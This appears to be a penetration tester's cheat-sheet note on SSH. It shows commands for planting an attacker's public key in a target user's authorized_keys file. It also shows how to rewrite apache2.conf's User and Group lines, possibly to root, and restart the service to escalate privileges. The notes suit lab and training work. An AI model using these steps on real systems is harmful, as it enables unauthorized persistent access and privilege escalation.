SSH
Connecting to a system using ssh and ssh key:
ssh -i ssh_key -p 22 admin@someserver.com
How to make SSH keys
(On your kali machine:)
ssh-keygen
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB ---SNIP--- +EC1Hg/Cm/V6CRrHM= kali@kali

(On the target machine,)
mkdir /home/dev/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB ---SNIP--- +EC1Hg/Cm/V6CRrHM= kali@kali" > /home/dev/.ssh/authorized_keys

(copy the target machine generated private key locally on your machine and now ssh into the machine with it)
ssh -i id_rsa dev@192.168.x.150
If you have start, stop, restart capability for SSH (in sudo -l for ex), then configure the /etc/apache2/apache2.conf file so when you ssh in again, you log in as different use (lateral or priv esc) 
** this example is when the tester used reverse shell to ssh into the VM

cd /var/tmp
cp /etc/apache2/apache2.conf .
sed -i 's/User ${APACHE_RUN_USER}/User userName/g' apache2.conf
sed -i 's/Group ${APACHE_RUN_GROUP}/Group userGroup/g' apache2.conf
    ** maybe userName and userGroup could be root // root
cp apache2.conf /etc/apache2/apache2.conf

** DO NOT STOP apache, but restart it instead **

/bin/systemctl restart apache2

** use reverse shell again to ssh




